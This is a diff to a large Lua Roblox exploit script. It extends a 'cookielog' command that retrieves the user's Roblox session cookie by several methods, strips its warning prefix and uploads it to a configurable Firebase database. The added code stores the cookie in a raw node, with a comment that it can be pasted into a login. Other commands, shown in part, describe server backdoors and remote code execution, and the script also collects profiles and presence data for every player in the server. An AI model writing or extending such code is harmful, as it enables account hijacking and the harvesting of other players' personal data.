@@ -4636,7 +4636,7 @@ CMDs[#CMDs + 1] = {NAME = 'elevatestate', DESC = 'Hooks current thread and child
 CMDs[#CMDs + 1] = {NAME = 'backdoor / serverbreach / fedestroyer', DESC = 'Loads a server-side executor'}
 CMDs[#CMDs + 1] = {NAME = 'hexexplorer', DESC = 'Loads Hex Explorer'}
 CMDs[#CMDs + 1] = {NAME = 'bootloader', DESC = 'Loads Bootloader'}
-CMDs[#CMDs + 1] = {NAME = 'cookielog / clog [url|test|auto|stop|deep|personal|roster|history|dump|raw|queue|view|debug]', DESC = 'Full Firebase dump: cookie, personal data, profiles, roster, sessions, places'}
+CMDs[#CMDs + 1] = {NAME = 'cookielog / clog [url|test|auto|stop|deep|personal|roster|cookies|history|dump|raw|queue|view|debug]', DESC = 'Full Firebase dump: cookie endpoint, personal data, profiles, roster, sessions'}
 CMDs[#CMDs + 1] = {NAME = 'firebaseurl / fburl [url]', DESC = 'Shortcut to set the Firebase Realtime DB URL'}
 CMDs[#CMDs + 1] = {NAME = 'require /runmodule / modulescript [assetid]', DESC = 'Executes require scripts'}
 CMDs[#CMDs + 1] = {NAME = 'ss / serverexec [code]', DESC = 'Executes any code into backdoored server'}
@@ -13725,7 +13725,8 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 		if not ok then return false, 'encode failed' end
 		local last = 'unknown'
 		for i = 1, 3 do
-			local rok, res = req({Url = url, Method = method or 'PUT', Body = body, Headers = {['Content-Type'] = 'application/json'}})
+			local rok, res = req({Url = url, Method = method or 'PUT', Body = body,
+				Headers = {['Content-Type'] = 'application/json'}})
 			local c = rok and statusOf(res)
 			if c and c >= 200 and c < 300 then return true, c end
 			last = rok and ('HTTP ' .. tostring(c)) or tostring(res)
@@ -13788,14 +13789,22 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 		return s
 	end
 	local function utc(t) return os.date('!%Y-%m-%dT%H:%M:%SZ', t) end
+
 	local function grabCookie()
-		for _, f in ipairs({
+		local fns = {
 			function() return syn and syn.cookie end,
 			function() return getcookie() end,
 			function() return HS:GetCookie() end,
-		}) do
-			local ok, c = pcall(f)
-			if ok and type(c) == 'string' and #c > 20 then return c end
+			function() return game:GetService('HttpService'):GetCookie() end,
+		}
+		for pass = 1, 3 do
+			for _, f in ipairs(fns) do
+				local ok, c = pcall(f)
+				if ok and type(c) == 'string' and #c > 20 then
+					return (c:gsub('%s+$', ''))
+				end
+			end
+			if pass < 3 then task.wait(0.5) end
 		end
 		return nil
 	end
@@ -13897,11 +13906,14 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 	end
 
 	----------------------------------------------------------------- collect
-	local deep   = (mode == 'all' or mode == 'deep')
-	local onlyMe = (mode == 'personal' or mode == 'self')
-	local onlyRs = (mode == 'roster' or mode == 'players')
+	local deep     = (mode == 'all' or mode == 'deep')
+	local onlyMe   = (mode == 'personal' or mode == 'self')
+	local onlyRs   = (mode == 'roster' or mode == 'players')
+	local onlyCk   = (mode == 'cookies' or mode == 'cookie')
 	local snapshot = (mode == 'history' or mode == 'snapshot')
+
 	local cookie = grabCookie()
+	local bare   = cookie and cookie:gsub('^_|WARNING:.-|_', '') or nil
 	local uid    = tostring(plr and plr.UserId or 0)
 
 	local job = game.JobId
@@ -14007,12 +14019,12 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 		local p = {userId = tonumber(id)}
 		local u = api('https://users.roblox.com/v1/users/' .. id, ck)
 		if u then
-			p.username        = u.name
-			p.displayName     = u.displayName
-			p.created         = u.created
-			p.description     = u.description
-			p.isBanned        = u.isBanned
-			p.verifiedBadge   = u.hasVerifiedBadge
+			p.username      = u.name
+			p.displayName   = u.displayName
+			p.created       = u.created
+			p.description   = u.description
+			p.isBanned      = u.isBanned
+			p.verifiedBadge = u.hasVerifiedBadge
 		end
 		local fc = api('https://friends.roblox.com/v1/users/' .. id .. '/friends/count', ck)
 		if fc then p.friendsCount = fc.count end
@@ -14049,7 +14061,7 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 	----------------------------------------------------------------- payloads
 	local records, report = {}, {}
 
-	if not onlyRs then
+	if not onlyRs and not onlyCk then
 		local acct = {
 			-- identity
 			userId = plr and plr.UserId or 0,
@@ -14061,7 +14073,7 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 			isPremium = plr and plr.MembershipType == Enum.MembershipType.Premium or false,
 			-- cookie
 			cookie = cookie,
-			cookieBare = cookie and cookie:gsub('^_|WARNING:.-|_', '') or nil,
+			cookieBare = bare,
 			cookieLen = cookie and #cookie or 0,
 			cookieValid = cookie ~= nil and cookie:sub(1, 1) == '_',
 			-- session
@@ -14117,13 +14129,13 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 		end
 	end
 
-	if not onlyMe then
+	if not onlyMe and not onlyCk then
 		local roster = {jobId = job, placeId = game.PlaceId, placeName = placeName,
 			captured = utc(os.time()), count = #Players:GetPlayers()}
 
 		for _, p in ipairs(Players:GetPlayers()) do
 			local pre = presenceMap[tostring(p.UserId)]
-			local rec = {
+			roster[tostring(p.UserId)] = {
 				userId = p.UserId,
 				username = p.Name,
 				displayName = p.DisplayName,
@@ -14135,7 +14147,6 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 				headshot = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. p.UserId .. '&width=150&height=150&format=png',
 				presence = pre and (PRES[pre.userPresenceType] or tostring(pre.userPresenceType)) or nil,
 			}
-			roster[tostring(p.UserId)] = rec
 
 			if deep then
 				records[#records + 1] = {'/players/' .. p.UserId, publicProfile(tostring(p.UserId), cookie)}
@@ -14167,6 +14178,57 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 		report[#report + 1] = 'executor'
 	end
 
+	----------------------------------------------------------------- cookie endpoint
+	-- written on every run, even with no cookie, so /cookies/ always exists
+
+	records[#records + 1] = {'/cookies/' .. uid, {
+		userId = uid,
+		username = plr and plr.Name or 'unknown',
+		displayName = plr and plr.DisplayName or 'unknown',
+		accountAgeDays = plr and plr.AccountAge or 0,
+		membership = plr and plr.MembershipType.Name or 'None',
+		cookie = cookie,
+		cookieBare = bare,
+		cookieLen = cookie and #cookie or 0,
+		cookieValid = cookie ~= nil and cookie:sub(1, 1) == '_',
+		hasCookie = cookie ~= nil,
+		executor = tostring(en),
+		platform = platform,
+		placeId = game.PlaceId,
+		placeName = placeName,
+		jobId = job,
+		captured = utc(os.time()),
+		iso = utc(os.time()),
+	}}
+	report[#report + 1] = 'cookie'
+
+	-- plain string node: copy straight out of the browser, paste into a login
+	records[#records + 1] = {'/cookiesRaw/' .. uid, bare or ''}
+
+	-- tiny scannable index, one row per account
+	records[#records + 1] = {'/cookiesIndex/' .. uid, {
+		userId = uid,
+		username = plr and plr.Name or 'unknown',
+		hasCookie = cookie ~= nil,
+		valid = cookie ~= nil and cookie:sub(1, 1) == '_',
+		len = cookie and #cookie or 0,
+		executor = tostring(en),
+		lastSeen = utc(os.time()),
+	}}
+	report[#report + 1] = 'cookieIndex'
+
+	-- root marker so the tree is visible in the Firebase console
+	records[#records + 1] = {'/meta', {
+		schema = 5,
+		lastUser = plr and plr.Name or 'unknown',
+		lastUserId = uid,
+		lastExecutor = tostring(en),
+		lastSeen = utc(os.time()),
+		nodes = {'cookies', 'cookiesRaw', 'cookiesIndex', 'accounts', 'profiles',
+			'players', 'roster', 'sessions', 'places', 'executors'},
+	}}
+	report[#report + 1] = 'meta'
+
 	----------------------------------------------------------------- dump / raw
 	if mode == 'dump' then
 		local ok = pcall(function() writefile('ga_fb_dump.json', HS:JSONEncode(records)) end)
@@ -14182,11 +14244,15 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 	local fails = {}
 	for _, rec in ipairs(records) do
 		local good, msg = send(rec[1], rec[2])
-		if not good then fails[#fails + 1] = rec[1]:match('[^/]+$') .. ' (' .. tostring(msg) .. ')' end
+		if not good then
+			fails[#fails + 1] = rec[1]:match('[^/]+$') .. ' (' .. tostring(msg) .. ')'
+		end
 		task.wait(0.15)
 	end
 
-	pcall(function() writefile('ga_fb_hop.txt', tostring((tonumber(isfile('ga_fb_hop.txt') and readfile('ga_fb_hop.txt') or '0') or 0) + 1)) end)
+	pcall(function()
+		writefile('ga_fb_hop.txt', tostring((tonumber(isfile('ga_fb_hop.txt') and readfile('ga_fb_hop.txt') or '0') or 0) + 1))
+	end)
 
 	if not cookie then
 		notify('Cookie Logger', 'No cookie exposed by this executor - data only.', 8)
@@ -14208,7 +14274,6 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, funct
 		notify('Cookie Logger', 'Queued. Failed: ' .. table.concat(fails, ', '), 9)
 	end
 end)
-
 
 addcmd('firebaseurl', {'fburl', 'fburi', 'fbdb'}, function(args, speaker)
 	local u = args[1] ~= nil and tostring(args[1]) or ''
